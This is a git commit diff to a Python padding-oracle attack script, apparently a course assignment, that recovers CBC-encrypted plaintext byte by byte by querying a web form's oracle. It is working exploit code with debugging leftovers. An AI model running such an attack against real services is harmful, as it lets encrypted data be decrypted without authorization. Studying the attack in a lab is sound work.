fb291c55c387ff2b6087788e0307724206addaaf
CeliaYao329 <ycelia29@gmail.com>
2019-11-03 23:09:32 -0500

    fix the first-byte problem

--- poattack.py
+++ poattack.py
@@ -58,7 +58,6 @@ def po_attack_2blocks(po, ctx):
     @po: an instance of padding oracle. 
     @ctx: a ciphertext (bytearray)
     """
-    print("po_attack_2blocks")
     print("ctx: ", ctx)
     assert len(ctx) == 2 * po.block_length, "This function only accepts 2 block "\
         "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)
@@ -75,28 +74,29 @@ def po_attack_2blocks(po, ctx):
         hit = False
         for j in range(256):
             c0[-i] = j
-            test_cipher = (c0 + c1).hex()
+
+            test_cipher = (c1_hex_bytearray + c0 + c1).hex()
+            if i == 16:
+                test_cipher
             valid = po.test_ciphertext(test_cipher)
             if i == 1 and valid:
                 print("i = 1 found: ", j)
                 c0[-2] ^= 1
-                test_cipher = (c0 + c1).hex()
+                test_cipher = (c1_hex_bytearray + c0 + c1).hex()
                 if po.test_ciphertext(test_cipher):
                     hit = True
                     break
             elif valid:
                 hit = True
-                print("found: ", j)
+                print("found {}: ".format(i), j)
                 break
         assert hit
         intermediate[-i] = i ^ j
         m_byte = c0_hex_bytearray[-i] ^ intermediate[-i]
         msg_bytes[-i] = m_byte
-
-    print("msg_bytes: ", msg_bytes)
-    print(binascii.hexlify(msg_bytes))
     msg = bytes(msg_bytes).decode('utf-8')
-    print(msg)
+    print(type(msg))
+    msg.replace('\r', '')
     return msg
 
 def po_attack(po, ctx):
@@ -106,47 +106,26 @@ def po_attack(po, ctx):
     You don't have to unpad the message.
     """
     ctx_blocks = list(split_into_blocks(ctx, po.block_length))
-    nblocks = len(ctx_blocks)
-    msg_blocks = []
-    for i in range(nblocks-1):
-        msg_blocks.append(po_attack_2blocks(po, "".join([ctx_blocks[-i-1], ctx_blocks[-i]])))
-        break
-    msg_blocks = msg_blocks[::-1]
-    print(msg_blocks)
-    print(msg_blocks.decode("hex"))
-    print(msg_blocks[1:].decode("hex"))
+    messages = []
+    for i in range(len(ctx_blocks)-1):
+        two_block_ctx = ctx_blocks[-i-2] + ctx_blocks[-i-1]
+        messages.append(po_attack_2blocks(po, two_block_ctx))
+    messages = messages[::-1]
+    print("".join(messages))
+    return "".join(messages)
     
     # TODO: Implement padding oracle attack for arbitrary length message.
 
 if __name__=='__main__':
     po = PaddingOracle(SETCOINS_FORM_URL)
-    from app.api.encr_decr import Encryption
 
-    encryption_key = b'\x00' * 16
-    cbc = Encryption(encryption_key)
-    password = 'a'
-    ct = cbc.encrypt(password.encode('utf-8')).hex()
-    print(po.test_ciphertext(ct))
-    quit()
-    # ct = "e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d"
+    # from app.api.encr_decr import Encryption
+    #
+    # encryption_key = b'\x00' * 16
+    # cbc = Encryption(encryption_key)
+    # password = 'world'
+    # ct = cbc.encrypt(password.encode('utf-8')).hex()
+
+    ct = "e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d"
     ctxt_bytes = bytearray.fromhex(ct)
-    # print(ctxt_bytes)
-    # print("len(ctxt_bytes): ", len(ctxt_bytes))
-    ctxt_new = ctxt_bytes[-32:]
-    print("new: ", po.test_ciphertext(ctxt_new.hex()))
-
-    # print("ciphertext[-32:], ", po.test_ciphertext(ct[-32:]))
-    # print("ciphertext[-48:], ", po.test_ciphertext(ct[-48:]))
-    # print("ciphertext[-64:], ", po.test_ciphertext(ct[-64:]))
-
-    po_attack_2blocks(po, ctxt_new)
-    # print("ct: ", ct)
-    # print(len(ct))
-    # try:
-    #     print("can decrypt")
-    #     print(cbc.decrypt(bytes.fromhex(ct)))
-    # except:
-    #     print("no")
-
-    # print(po.test_ciphertext("d98b69b2fe71dc14e92a14bcbcc67e65514a32de7727dbc9d93f0ba0112029bd"[-32:]))
-    # print(po.test_ciphertext('d98b69b2fe71dc14e92a14bcbcc67e65514a32de7727dbc9d93f0ba0112029bd'))
+    po_attack(po, ctxt_bytes)
